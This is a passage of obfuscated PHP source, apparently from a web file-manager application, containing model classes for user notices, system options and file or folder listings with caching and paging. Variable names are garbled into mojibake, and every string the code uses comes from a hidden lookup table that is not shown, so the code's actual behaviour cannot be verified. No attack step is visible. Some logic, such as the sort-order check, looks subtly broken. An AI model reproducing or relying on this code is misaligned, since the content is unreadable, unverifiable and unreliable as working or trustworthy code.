parent::remove($Ò›Î„Û¥); } public function sort($Ï€ƒ“­Î, $Ù€Ù²ÙŸ) { return parent::update($Ï€ƒ“­Î, $Ù€Ù²ÙŸ); } public function enable($øò­òª, $ËóØ¢) { return parent::update($øò­òª, array($_SERVER[Õò”†—·][2417] => $ËóØ¢)); } private function initUserOption() { $Üª«Øïµ =& $_SERVER[Õò”†—·]; $this->optionType = $Üª«Øïµ[2418]; $this->modelType = $Üª«Øïµ[2419]; $this->field = array($Üª«Øïµ[2420], $Üª«Øïµ[42], $Üª«Øïµ[207], $Üª«Øïµ[43], $Üª«Øïµ[2421], $Üª«Øïµ[801], $Üª«Øïµ[227]); } public function userNoticeGet($úĞİ’”å = false) { $this->initUserOption(); return parent::listData($úĞİ’”å, $_SERVER[Õò”†—·][459], !0); } public function userNoticeAdd($åöøšè•) { $µï ÆÜÔ =& $_SERVER[Õò”†—·]; $this->initUserOption(); $ÓŞšíü“ = $this->findByKey($µï ÆÜÔ[2420], $åöøšè•[$µï ÆÜÔ[459]]); if ($ÓŞšíü“) { return !0; } $øñİâèû = array($µï ÆÜÔ[2420] => $åöøšè•[$µï ÆÜÔ[459]], $µï ÆÜÔ[42] => $åöøšè•[$µï ÆÜÔ[42]], $µï ÆÜÔ[207] => $åöøšè•[$µï ÆÜÔ[207]], $µï ÆÜÔ[43] => isset($åöøšè•[$µï ÆÜÔ[43]]) ? $åöøšè•[$µï ÆÜÔ[43]] : 1, $µï ÆÜÔ[2421] => isset($åöøšè•[$µï ÆÜÔ[2421]]) ? $åöøšè•[$µï ÆÜÔ[2421]] : 0, $µï ÆÜÔ[801] => 0, $µï ÆÜÔ[227] => 0); return parent::insert($øñİâèû); } public function userNoticeEdit($õ»’Á—É, $‚û³–íæ) { $this->initUserOption(); return parent::update($õ»’Á—É, $‚û³–íæ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\155\x5f\157\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\x6f\x6c\145", "\x72\x6f\154\145\107\x72\157\165\160", "\x72\145\x67\x69\163\164", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($‹Œé•´) { return "\123\171\163\x74\145\x6d\117\x70\164\151\x6f\156\137{$‹Œé•´}"; } protected function optionDefault($ñ™æÎØ = '') { $å¾İ£Š =& $_SERVER[Õò”†—·]; if ($ñ™æÎØ == $å¾İ£Š[22]) { return $GLOBALS[$å¾İ£Š[16]][$å¾İ£Š[441]]; } } } goto aÕ„Š’¨†; a‘ µÈ¡Úé: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($µ÷Ã±è = false, $‡àëŞôÈ = '', $ÁˆÁÄÄ = false) { $‘ÔËŞ•¿ =& $_SERVER[Õò”†—·]; $”ÔÕµ’¿ = $this->cacheGet($‡àëŞôÈ); $‘˜ ìğ³ = $this->optionDefault($‡àëŞôÈ); $‘˜ ìğ³ = is_array($‘˜ ìğ³) ? $‘˜ ìğ³ : array(); if (is_array($”ÔÕµ’¿)) { $”ÔÕµ’¿ = array_merge($‘˜ ìğ³, $”ÔÕµ’¿); return $µ÷Ã±è ? isset($”ÔÕµ’¿[$µ÷Ã±è]) ? $”ÔÕµ’¿[$µ÷Ã±è] : null : $”ÔÕµ’¿; } $ÏáìËè = $this->filterWhere(array($‘ÔËŞ•¿[43] => $‡àëŞôÈ)); $”ÔÕµ’¿ = $this->where($ÏáìËè)->select(); $”ÔÕµ’¿ = array_to_keyvalue($”ÔÕµ’¿, $‘ÔËŞ•¿[107], $‘ÔËŞ•¿[434]); foreach ($”ÔÕµ’¿ as $‘ƒ–“ú÷ => $È¬¼ÄÙ) { if ($ÁˆÁÄÄ || in_array($‘ƒ–“ú÷, $this->jsonField)) { $”ÔÕµ’¿[$‘ƒ–“ú÷] = json_decode($È¬¼ÄÙ, !0); } } $this->cacheSet($‡àëŞôÈ, $”ÔÕµ’¿); $”ÔÕµ’¿ = array_merge($‘˜ ìğ³, $”ÔÕµ’¿); return $µ÷Ã±è ? $”ÔÕµ’¿[$µ÷Ã±è] : $”ÔÕµ’¿; } public function set($ä¢ß‹, $ü¾ ¾† = false, $æ‘ÙÌ¨ = '') { $˜ÄÒœèˆ =& $_SERVER[Õò”†—·]; $this->cacheRemove($æ‘ÙÌ¨); $™¸¾€„¾ = array(); $«ŸÎÙƒ¼ = is_array($ä¢ß‹) ? $ä¢ß‹ : array($ä¢ß‹ => $ü¾ ¾†); foreach ($«ŸÎÙƒ¼ as $ÊªèááŸ => $ˆâå­‰ñ) { if (is_array($ˆâå­‰ñ)) { $ˆâå­‰ñ = json_encode_force($ˆâå­‰ñ); } $this->checkLength($ˆâå­‰ñ, !1, $this->tableName . $˜ÄÒœèˆ[4] . $ä¢ß‹); $ˆâå­‰ñ = self::textEncode($ˆâå­‰ñ); $«ŸÎÙƒ¼ = array($˜ÄÒœèˆ[43] => $æ‘ÙÌ¨, $˜ÄÒœèˆ[107] => $ÊªèááŸ, $˜ÄÒœèˆ[434] => $ˆâå­‰ñ); $™¸¾€„¾[] = $this->filterWhere($«ŸÎÙƒ¼); } if (!$™¸¾€„¾) { return !0; } $Ö²Áå–‰ = $this->cacheKey($˜ÄÒœèˆ[460]); CacheLock::lock($Ö²Áå–‰); $şô¶¸ú’ = $this->addAll($™¸¾€„¾, array(), !0); CacheLock::unlock($Ö²Áå–‰); return $şô¶¸ú’; } protected function optionDefault($ëàıØç = '') { return !1; } public function setDeep($æƒÓĞä¬, $˜»í‹Õ‘ = false, $×¬í¥¾¬ = '') { $ˆÌ°ğ›­ = explode($_SERVER[Õò”†—·][20], $æƒÓĞä¬); $ÙÀĞä«± = $this->get(); array_set_value($ÙÀĞä«±, $æƒÓĞä¬, $˜»í‹Õ‘); $this->set($ˆÌ°ğ›­[0], $ÙÀĞä«±[$ˆÌ°ğ›­[0]], $×¬í¥¾¬); } public function remove($Æ‚†¸Ÿ, $ë¾®ğä£ = '') { $Ñ»Ö· =& $_SERVER[Õò”†—·]; $this->cacheRemove($ë¾®ğä£); $°†ÇœºÄ = $this->filterWhere(array($Ñ»Ö·[107] => $Æ‚†¸Ÿ, $Ñ»Ö·[43] => $ë¾®ğä£)); if (is_null($Æ‚†¸Ÿ)) { unset($°†ÇœºÄ[$Ñ»Ö·[107]]); } return $this->where($°†ÇœºÄ)->delete(); } public function cacheSet($ÍÔ©Àˆ¢, $¡»©şáĞ = false) { return Cache::set($this->cacheKey($ÍÔ©Àˆ¢), $¡»©şáĞ); } public function cacheGet($º±€‰Ğ) { return Cache::get($this->cacheKey($º±€‰Ğ)); } public function cacheRemove($—“Ñ¿…È) { return Cache::remove($this->cacheKey($—“Ñ¿…È)); } protected function filterWhere($¨´÷¬º­) { return $¨´÷¬º­; } protected function cacheKey($íñşÃê¶) { return $íñşÃê¶; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\143\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\155\x65" => "\151\x6f\x5f\163\x6f\165\162\x63\145\137\155\x65\164\141", "\155\x65\164\x61\x46\x69\x65\x6c\x64" => "\163\x6f\165\x72\143\x65\111\104"); protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\124\151\x6d\145", "\x74\151\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\165\x6e\143\164\151\x6f\156"), array("\x63\162\x65\x61\x74\145\x54\x69\x6d\x65", "\164\151\155\145", "\151\x6e\163\145\x72\164", "\x66\165\156\x63\x74\x69\157\156"), array("\x76\x69\x65\167\124\151\155\145", "\164\151\155\x65", "\x69\156\x73\x65\162\164", "\146\x75\156\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ì‹¨Ûáû) { return $this->listSource(array($_SERVER[Õò”†—·][461] => $Ì‹¨Ûáû)); } public function typeName($ö©¼ü) { static $òÃ£·ïĞ = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\x72\x6f\165\160"); return $òÃ£·ïĞ[$ö©¼ü . $_SERVER[Õò”†—·][22]]; } public function sourceListInfo($ÅÊİáµ, $µÑÅå»“ = false) { $ÎŸØş–ƒ =& $_SERVER[Õò”†—·]; $ÅÊİáµ = $ÅÊİáµ ? $ÅÊİáµ : array(); $ÅÊİáµ = array_filter(array_unique($ÅÊİáµ)); if (!$ÅÊİáµ) { return array(); } $éßàĞœÊ = $this->where(array($ÎŸØş–ƒ[194] => array($ÎŸØş–ƒ[17], $ÅÊİáµ)))->select(); $this->_listDataApply($éßàĞœÊ, $µÑÅå»“); return array_to_keyvalue($éßàĞœÊ, $ÎŸØş–ƒ[194]); } public function pathInfoFilter(&$µı½’ñÎ) { $‹œ´‹Õ =& $_SERVER[Õò”†—·]; static $ÅÌôÕæ› = false; static $Ÿ¼Ôµ¸Û = false; static $–õ‘´‚± = false; if (!$ÅÌôÕæ›) { $âç§ŞéÓ = $‹œ´‹Õ[462]; $âç§ŞéÓ .= $‹œ´‹Õ[463]; $âç§ŞéÓ .= $‹œ´‹Õ[464]; $Ú™·÷Ø­ = $‹œ´‹Õ[465]; $÷“Ï•‰³ = explode($‹œ´‹Õ[60], $Ú™·÷Ø­); $ÅÌôÕæ› = explode($‹œ´‹Õ[60], $âç§ŞéÓ); $Ÿ¼Ôµ¸Û = array(); foreach ($ÅÌôÕæ› as $õôşŠŒ) { if (in_array($õôşŠŒ, $÷“Ï•‰³)) { continue; } $Ÿ¼Ôµ¸Û[] = $õôşŠŒ; } $–õ‘´‚± = explode($‹œ´‹Õ[60], $‹œ´‹Õ[466]); } foreach ($–õ‘´‚± as $û¦±…£) { if (isset($µı½’ñÎ[$û¦±…£])) { $µı½’ñÎ[$û¦±…£] = intval($µı½’ñÎ[$û¦±…£]); } } $µı½’ñÎ[$‹œ´‹Õ[97]] = $‹œ´‹Õ[467] . $µı½’ñÎ[$‹œ´‹Õ[194]] . $‹œ´‹Õ[468]; $µı½’ñÎ[$‹œ´‹Õ[43]] = $µı½’ñÎ[$‹œ´‹Õ[469]] == 1 ? $‹œ´‹Õ[88] : $‹œ´‹Õ[231]; $µı½’ñÎ[$‹œ´‹Õ[191]] = $this->typeName($µı½’ñÎ[$‹œ´‹Õ[191]]); if ($µı½’ñÎ[$‹œ´‹Õ[469]] != 1) { $µı½’ñÎ[$‹œ´‹Õ[188]] = $µı½’ñÎ[$‹œ´‹Õ[470]]; unset($µı½’ñÎ[$‹œ´‹Õ[470]]); } $À­şÄÊ = $ÅÌôÕæ›; if (isset($µı½’ñÎ[$‹œ´‹Õ[471]]) && $µı½’ñÎ[$‹œ´‹Õ[471]][$‹œ´‹Õ[472]] == -1) { $À­şÄÊ = $Ÿ¼Ôµ¸Û; } $µı½’ñÎ = array_field_key($µı½’ñÎ, $À­şÄÊ); return $µı½’ñÎ; } public function listUserFav() { $ç…É ¦– =& $_SERVER[Õò”†—·]; $úš§•ÊÁ = Model($ç…É ¦–[473])->listData(); $ã›ıˆĞõ = array_filter_by_field($úš§•ÊÁ, $ç…É ¦–[43], $ç…É ¦–[474]); $ã›ıˆĞõ = array_to_keyvalue($ã›ıˆĞõ, $ç…É ¦–[22], $ç…É ¦–[97]); if ($ã›ıˆĞõ) { $íÍ»Îî… = $this->listSource(array($ç…É ¦–[475] => array($ç…É ¦–[476], $ã›ıˆĞõ))); } $íÍ»Îî… = array_to_keyvalue($íÍ»Îî…[$ç…É ¦–[429]], $ç…É ¦–[194]); foreach ($úš§•ÊÁ as &$äàÄÜûğ) { $äàÄÜûğ = array($ç…É ¦–[477] => $äàÄÜûğ[$ç…É ¦–[459]], $ç…É ¦–[478] => $äàÄÜûğ[$ç…É ¦–[42]], $ç…É ¦–[479] => $äàÄÜûğ[$ç…É ¦–[97]], $ç…É ¦–[480] => $äàÄÜûğ[$ç…É ¦–[43]], $ç…É ¦–[481] => $äàÄÜûğ[$ç…É ¦–[232]], $ç…É ¦–[482] => $äàÄÜûğ[$ç…É ¦–[98]]); if ($äàÄÜûğ[$ç…É ¦–[43]] == $ç…É ¦–[474] && $íÍ»Îî…[$äàÄÜûğ[$ç…É ¦–[97]]]) { $äàÄÜûğ[$ç…É ¦–[100]] = $íÍ»Îî…[$äàÄÜûğ[$ç…É ¦–[97]]]; } } unset($äàÄÜûğ); return $úš§•ÊÁ; } public function listUserTag($ÄçÓ´Û) { $ÛØ©Œ¢² =& $_SERVER[Õò”†—·]; if ($ÄçÓ´Û && !is_array($ÄçÓ´Û)) { $ÄçÓ´Û = array($ÄçÓ´Û); } $Ö²”ŸåÂ = Model($ÛØ©Œ¢²[483])->listData(); $Ü£÷˜¼Œ = array(); $­®¨ˆ˜¡ = array(); foreach ($Ö²”ŸåÂ as $ùí¹¾Å£) { $«ìÃÍï’ = $ùí¹¾Å£[$ÛØ©Œ¢²[97]]; if (!$«ìÃÍï’) { continue; } if (!isset($­®¨ˆ˜¡[$«ìÃÍï’])) { $­®¨ˆ˜¡[$«ìÃÍï’] = array(); } $­®¨ˆ˜¡[$«ìÃÍï’][] = $ùí¹¾Å£[$ÛØ©Œ¢²[484]]; $Ü£÷˜¼Œ[$ùí¹¾Å£[$ÛØ©Œ¢²[97]]] = $ùí¹¾Å£; } $ù¯êÔÏÒ = array(); $ÇŸÎˆ¯Ú = array(); $ÕßÎÌåŸ = array(); foreach ($­®¨ˆ˜¡ as $ÁØÜ­ù° => $˜ˆ ¬ø ) { $ÔÌïØâÀ = !0; if (!$ÄçÓ´Û) { $ù¯êÔÏÒ[] = $ÁØÜ­ù°; continue; } foreach ($ÄçÓ´Û as $ü¹ÈÆ) { if (!in_array($ü¹ÈÆ, $˜ˆ ¬ø )) { $ÔÌïØâÀ = !1; break; } } if (!$ÔÌïØâÀ) { continue; } if (!is_numeric($ÁØÜ­ù°)) { $¦©ëìæ¹ = $Ü£÷˜¼Œ[$ÁØÜ­ù°]; $Ş„¶Î°’ = array($ÛØ©Œ¢²[42] => $¦©ëìæ¹[$ÛØ©Œ¢²[42]], $ÛØ©Œ¢²[97] => $¦©ëìæ¹[$ÛØ©Œ¢²[97]], $ÛØ©Œ¢²[43] => $¦©ëìæ¹[$ÛØ©Œ¢²[43]], $ÛØ©Œ¢²[100] => array($ÛØ©Œ¢²[485] => 1), $ÛØ©Œ¢²[233] => !0); if ($¦©ëìæ¹[$ÛØ©Œ¢²[43]] == $ÛØ©Œ¢²[231]) { $ÕßÎÌåŸ[] = $Ş„¶Î°’; } if ($¦©ëìæ¹[$ÛØ©Œ¢²[43]] == $ÛØ©Œ¢²[88]) { $ÇŸÎˆ¯Ú[] = $Ş„¶Î°’; } continue; } $ù¯êÔÏÒ[] = $ÁØÜ­ù°; } if ($ù¯êÔÏÒ) { $õ¤¤Öùµ = $this->listSource(array($ÛØ©Œ¢²[475] => array($ÛØ©Œ¢²[476], $ù¯êÔÏÒ))); } $õ¤¤Öùµ = $õ¤¤Öùµ ? $õ¤¤Öùµ : array($ÛØ©Œ¢²[95] => array(), $ÛØ©Œ¢²[96] => array()); $õ¤¤Öùµ[$ÛØ©Œ¢²[95]] = array_merge($õ¤¤Öùµ[$ÛØ©Œ¢²[95]], $ÇŸÎˆ¯Ú); $õ¤¤Öùµ[$ÛØ©Œ¢²[96]] = array_merge($õ¤¤Öùµ[$ÛØ©Œ¢²[96]], $ÕßÎÌåŸ); if (isset($õ¤¤Öùµ[$ÛØ©Œ¢²[426]]) && count($ù¯êÔÏÒ) == $õ¤¤Öùµ[$ÛØ©Œ¢²[426]][$ÛØ©Œ¢²[427]]) { return $õ¤¤Öùµ; } $ˆ³Ñ°àâ = array(); $Ë“ıÒ´Ù = array_to_keyvalue($õ¤¤Öùµ[$ÛØ©Œ¢²[95]], $ÛØ©Œ¢²[22], $ÛØ©Œ¢²[194]); $ªùƒÅ…¬ = array_to_keyvalue($õ¤¤Öùµ[$ÛØ©Œ¢²[96]], $ÛØ©Œ¢²[22], $ÛØ©Œ¢²[194]); $ÍãÌ ´ = array_merge($ªùƒÅ…¬, $Ë“ıÒ´Ù); foreach ($ù¯êÔÏÒ as $«ìÃÍï’) { if (!in_array($«ìÃÍï’, $ÍãÌ ´)) { $ˆ³Ñ°àâ[] = $«ìÃÍï’; } } if ($ˆ³Ñ°àâ) { Model($ÛØ©Œ¢²[486])->removeBySource($ˆ³Ñ°àâ); } return $õ¤¤Öùµ; } public function listUserRecycle() { $ú©œ›š =& $_SERVER[Õò”†—·]; $ÈÃ¹£úğ = Model($ú©œ›š[487])->listData(); if (!$ÈÃ¹£úğ) { return array(); } $¬…™äöÆ = array($ú©œ›š[475] => array($ú©œ›š[476], $ÈÃ¹£úğ), $ú©œ›š[488] => 1); return $this->listSource($¬…™äöÆ); } public function listSource($õ¡å‡Éï, $Ÿ™ÓüÁä = 3000, $¥íÒ¸Éº = false) { $‚ıı¼åÍ =& $_SERVER[Õò”†—·]; if (!isset($õ¡å‡Éï[$‚ıı¼åÍ[489]])) { $õ¡å‡Éï[$‚ıı¼åÍ[489]] = 0; } if (isset($õ¡å‡Éï[$‚ıı¼åÍ[193]]) && $õ¡å‡Éï[$‚ıı¼åÍ[193]] == $‚ıı¼åÍ[229]) { $õ¡å‡Éï[$‚ıı¼åÍ[470]] = array($‚ıı¼åÍ[391], $‚ıı¼åÍ[490]); } $çèºê®Á = $‚ıı¼åÍ[491]; $¾ƒ–ßã£ = $this->field($çèºê®Á)->_makeOrder()->where($õ¡å‡Éï)->selectPage($Ÿ™ÓüÁä); $this->_listPageCheck($¾ƒ–ßã£, $çèºê®Á, $õ¡å‡Éï); $this->_listDataApply($¾ƒ–ßã£[$‚ıı¼åÍ[429]], $¥íÒ¸Éº); $this->_listMake($¾ƒ–ßã£); return $¾ƒ–ßã£; } private function _listPageCheck(&$çĞªáÂ, $…²ÇÓ›”, $½’ïÏÈè) { $ñ±³‚ˆù =& $_SERVER[Õò”†—·]; if (!is_array($çĞªáÂ[$ñ±³‚ˆù[426]])) { return; } $ïÉ–Ïïï = $çĞªáÂ[$ñ±³‚ˆù[426]]; if ($ïÉ–Ïïï[$ñ±³‚ˆù[428]] <= 1) { return; } if ($ïÉ–Ïïï[$ñ±³‚ˆù[427]] >= 100000) { return; } if (Model($ñ±³‚ˆù[492])->get($ñ±³‚ˆù[493]) != $ñ±³‚ˆù[494]) { return; } $…²ÇÓ›” = str_replace(array($ñ±³‚ˆù[63], $ñ±³‚ˆù[402], $ñ±³‚ˆù[12]), $ñ±³‚ˆù[22], $…²ÇÓ›”); $…²ÇÓ›” = $ñ±³‚ˆù[495] . str_replace($ñ±³‚ˆù[60], $ñ±³‚ˆù[496], $…²ÇÓ›”) . $ñ±³‚ˆù[497]; $ü‘©±±× = $ñ±³‚ˆù[498]; $ü‘©±±× = $ü‘©±±× . $ñ±³‚ˆù[499]; $ó»³Ğ­ = $ïÉ–Ïïï[$ñ±³‚ˆù[423]] * ($ïÉ–Ïïï[$ñ±³‚ˆù[413]] - 1) . $ñ±³‚ˆù[60] . $ïÉ–Ïïï[$ñ±³‚ˆù[423]]; $ÒØË¡³· = $this->_makeOrder(!0); $ø´ßâ‡ = $ñ±³‚ˆù[495] . str_replace($ñ±³‚ˆù[60], $ñ±³‚ˆù[496], $ÒØË¡³·[0]); if (strpos($ø´ßâ‡, $ñ±³‚ˆù[500])) { $ø´ßâ‡ = str_replace($ñ±³‚ˆù[500], $ñ±³‚ˆù[501], $ø´ßâ‡); } else { $ø´ßâ‡ .= $ñ±³‚ˆù[502] . $ÒØË¡³·[1]; } $ª®ß¶«£ = array(); foreach ($½’ïÏÈè as $ØÜíÛş => $Åº¸÷¢ˆ) { $ª®ß¶«£[$ñ±³‚ˆù[495] . $ØÜíÛş] = $Åº¸÷¢ˆ; } $this->alias($ñ±³‚ˆù[503])->field($…²ÇÓ›”)->limit($ó»³Ğ­)->order($ø´ßâ‡); $³ñ˜Ã = $this->join($ü‘©±±×)->where($ª®ß¶«£)->select(); if ($³ñ˜Ã) { $çĞªáÂ[$ñ±³‚ˆù[429]] = $³ñ˜Ã; } } protected function _makeOrder($¤öÄÌí = false) { $…ïš‚É =& $_SERVER[Õò”†—·]; $÷İßŸ» = Model($…ïš‚É[504])->get($…ïš‚É[505]); $õÉŒ†·º = Model($…ïš‚É[504])->get($…ïš‚É[506]); $¶ªâÂ¡ = array($…ïš‚É[507] => $…ïš‚É[508], $…ïš‚É[509] => $…ïš‚É[510]); $Ô ‘ôÍó = array($…ïš‚É[42] => $…ïš‚É[42], $…ïš‚É[89] => $…ïš‚É[89], $…ïš‚É[188] => $…ïš‚É[470], $…ïš‚É[511] => $…ïš‚É[511], $…ïš‚É[512] => $…ïš‚É[513], $…ïš‚É[232] => $…ïš‚É[232], $…ïš‚É[98] => $…ïš‚É[98]); $éÃèÏíË = Input::get($…ïš‚É[514], $…ïš‚É[17], $÷İßŸ», array_keys($Ô ‘ôÍó)); $Œ£¬²˜ò = Input::get($…ïš‚É[515], $…ïš‚É[17], $õÉŒ†·º, array_keys($¶ªâÂ¡)); if (!in_array($éÃèÏíË, array_keys($Ô ‘ôÍó))) { $éÃèÏíË = $…ïš‚É[42]; } if (!in_array($Œ£¬²˜ò, array_keys($¶ªâÂ¡))) { $éÃèÏíË = $…ïš‚É[507]; } if ($éÃèÏíË == $…ïš‚É[42]) { } $ù÷¾åĞş = $…ïš‚É[516] . $Ô ‘ôÍó[$éÃèÏíË] . $…ïš‚É[63] . $¶ªâÂ¡[$Œ£¬²˜ò]; $ù÷¾åĞş = rtrim(trim($ù÷¾åĞş), $…ïš‚É[60]); if ($¤öÄÌí) { return array($ù÷¾åĞş, $¶ªâÂ¡[$Œ£¬²˜ò]); } return $this->order($ù÷¾åĞş); } protected function _listDataApplyItem($®Å èó, $Âµ€ Ğ™ = false) { $ó®¾ßÂª = array($®Å èó); $this->_listDataApply($ó®¾ßÂª, $Âµ€ Ğ™); return $ó®¾ßÂª[0]; } protected function _listDataApply(&$ÔŠ™âŠ, $«” åÌ» = false) { $Éûù§ğø =& $_SERVER[Õò”†—·]; if (!$ÔŠ™âŠ) { $ÔŠ™âŠ = array(); return; } $Ïš…õ”… = array_to_keyvalue($ÔŠ™âŠ, $Éûù§ğø[22], $Éûù§ğø[194]); $Ïš…õ”… = array_unique($Ïš…õ”…); $this->_listSourceCache($ÔŠ™âŠ); if (!$«” åÌ») { $this->_listAppendMeta($ÔŠ™âŠ, $Ïš…õ”…); $this->_listAppendFileMeta($ÔŠ™âŠ, $Ïš…õ”…); $this->_listAppendChildren($ÔŠ™âŠ, $Ïš…õ”…); } $this->_listAppendPath($ÔŠ™âŠ); $this->_listAppendAuth($ÔŠ™âŠ); $this->_listAppendSourceInfo($ÔŠ™âŠ, $Ïš…õ”…); $this->_listAppendUser($ÔŠ™âŠ); $this->_listFilterInfo($ÔŠ™âŠ, $«” åÌ»); $this->_listAppendAuthSecret($ÔŠ™âŠ); } protected function _listSourceCache($Û¿ÈÓ­Á) { $²‹¶·Ü® =& $_SERVER[Õò”†—·]; foreach ($Û¿ÈÓ­Á as $Öñ•ü¨£) { self::$cacheSourceInfo[$²‹¶·Ü®[517] . $Öñ•ü¨£[$²‹¶·Ü®[194]]] = $Öñ•ü¨£; } } protected function _listFilterInfo(&$Ü³á¸²Ş, $Ñ«œ«Óİ = false) { $¸–Ïøç· =& $_SERVER[Õò”†—·]; foreach ($Ü³á¸²Ş as &$¨ÉÓ×˜) { $¨ÉÓ×˜ = $this->pathInfoFilter($¨ÉÓ×˜); self::$cachePathInfo[$¸–Ïøç·[518] . intval($Ñ«œ«Óİ) . $¸–Ïøç·[446] . $¨ÉÓ×˜[$¸–Ïøç·[194]]] = $¨ÉÓ×˜; } unset($¨ÉÓ×˜); } protected function _listMake(&$²ñ§Ó¨‰) { $Í“ğŒ– =& $_SERVER[Õò”†—·]; $²ñ§Ó¨‰[$Í“ğŒ–[95]] = array(); $²ñ§Ó¨‰[$Í“ğŒ–[96]] = array(); foreach ($²ñ§Ó¨‰[$Í“ğŒ–[429]] as $ïÜÉÅÉÏ) { $¢²¿ä¸ = $ïÜÉÅÉÏ[$Í“ğŒ–[469]] == 1 ? $Í“ğŒ–[95] : $Í“ğŒ–[96]; $²ñ§Ó¨‰[$¢²¿ä¸][] = $ïÜÉÅÉÏ; } unset($²ñ§Ó¨‰[$Í“ğŒ–[429]]); } protected function _listAppendMeta(&$Ä’¤°ûü, $è—÷æÍ) { $ÁÚÏ©ÁÉ =& $_SERVER[Õò”†—·]; $µ·±Øñ = array($ÁÚÏ©ÁÉ[475] => array($ÁÚÏ©ÁÉ[476], $è—÷æÍ)); $±ı²˜ê› = Model($ÁÚÏ©ÁÉ[519])->field($ÁÚÏ©ÁÉ[520])->where($µ·±Øñ)->select(); if (!$±ı²˜ê›) { return; } $ËĞ¸¢Ì = array($ÁÚÏ©ÁÉ[521], $ÁÚÏ©ÁÉ[522], $ÁÚÏ©ÁÉ[501]); $éÉŒ… = array(); foreach ($±ı²˜ê› as $Ã£áÓ™·) { if (!isset($éÉŒ…[$Ã£áÓ™·[$ÁÚÏ©ÁÉ[194]]])) { $éÉŒ…[$Ã£áÓ™·[$ÁÚÏ©ÁÉ[194]]] = array(); } if (in_array($Ã£áÓ™·[$ÁÚÏ©ÁÉ[107]], $ËĞ¸¢Ì)) { continue; } $éÉŒ…[$Ã£áÓ™·[$ÁÚÏ©ÁÉ[194]]][$Ã£áÓ™·[$ÁÚÏ©ÁÉ[107]]] = $Ã£áÓ™·[$ÁÚÏ©ÁÉ[434]]; } foreach ($Ä’¤°ûü as &$ÂÍÅšĞ¯) { $ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[523]] = !1; if (isset($éÉŒ…[$ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[194]]])) { $ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[523]] = $éÉŒ…[$ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[194]]]; } if ($this->fileIsLock($ÂÍÅšĞ¯) && $ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[471]]) { $ÔÙïññ‘ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[471]][$ÁÚÏ©ÁÉ[472]] = AuthModel::authDisable($ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[471]][$ÁÚÏ©ÁÉ[472]], $ÔÙïññ‘); $ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[471]][$ÁÚÏ©ÁÉ[524]][$ÁÚÏ©ÁÉ[471]] = $ÂÍÅšĞ¯[$ÁÚÏ©ÁÉ[471]][$ÁÚÏ©ÁÉ[472]]; } } unset($ÂÍÅšĞ¯); } protected function _listAppendFileMeta(&$Æ³‚öú, $å‡ÅÏş) { $é‡ºåœ =& $_SERVER[Õò”†—·]; $³Æ…Ô´Û = array_to_keyvalue($Æ³‚öú, $é‡ºåœ[22], $é‡ºåœ[525]); $³Æ…Ô´Û = array_filter(array_unique($³Æ…Ô´Û)); if (!$³Æ…Ô´Û) { return; } $–ö™Â¨« = array($é‡ºåœ[526] => array($é‡ºåœ[476], $³Æ…Ô´Û)); $€ƒÜÜÃş = $é‡ºåœ[527]; $¦¶¥—Ñ© = Model($é‡ºåœ[528])->field($€ƒÜÜÃş)->where($–ö™Â¨«)->select(); $¦¶¥—Ñ© = array_to_keyvalue($¦¶¥—Ñ©, $é‡ºåœ[525]); $îª‘­Ù = Model($é‡ºåœ[529])->field($é‡ºåœ[530])->where($–ö™Â¨«)->select(); $îª‘­Ù = $îª‘­Ù ? $îª‘­Ù : array(); $êÍÙö¨‘ = array(); foreach ($îª‘­Ù as $¤ıõØ«š) { if (!isset($êÍÙö¨‘[$¤ıõØ«š[$é‡ºåœ[525]]])) { $êÍÙö¨‘[$¤ıõØ«š[$é‡ºåœ[525]]] = array(); } $êÍÙö¨‘[$¤ıõØ«š[$é‡ºåœ[525]]][$¤ıõØ«š[$é‡ºåœ[107]]] = $¤ıõØ«š[$é‡ºåœ[434]]; } foreach ($Æ³‚öú as &$û™ìÉÆô) { $ë¯§Ì‚Í = $û™ìÉÆô[$é‡ºåœ[525]]; if (!$ë¯§Ì‚Í || !is_array($¦¶¥—Ñ©[$ë¯§Ì‚Í])) { continue; } $¡ÜÂÀ‹Ğ = $¦¶¥—Ñ©[$ë¯§Ì‚Í]; $¡ÜÂÀ‹Ğ[$é‡ºåœ[89]] = $û™ìÉÆô[$é‡ºåœ[89]]; $¡ÜÂÀ‹Ğ[$é‡ºåœ[42]] = $û™ìÉÆô[$é‡ºåœ[42]]; if (!$¡ÜÂÀ‹Ğ[$é‡ºåœ[531]]) { Model($é‡ºåœ[528])->fileMd5Check($¡ÜÂÀ‹Ğ); } if (!isset(self::$cacheFileInfo[$é‡ºåœ[532] . $ë¯§Ì‚Í])) { self::$cacheFileInfo[$é‡ºåœ[532] . $ë¯§Ì‚Í] = array_merge(array(), $¡ÜÂÀ‹Ğ); } unset($¦¶¥—Ñ©[$ë¯§Ì‚Í][$é‡ºåœ[97]]); $˜•à¡çÎ = is_array($êÍÙö¨‘[$ë¯§Ì‚Í]) ? $êÍÙö¨‘[$ë¯§Ì‚Í] : array(); $û™ìÉÆô[$é‡ºåœ[533]] = array_merge($˜•à¡çÎ, $¦¶¥—Ñ©[$ë¯§Ì‚Í]); if (isset($û™ìÉÆô[$é‡ºåœ[533]][$é‡ºåœ[184]])) { 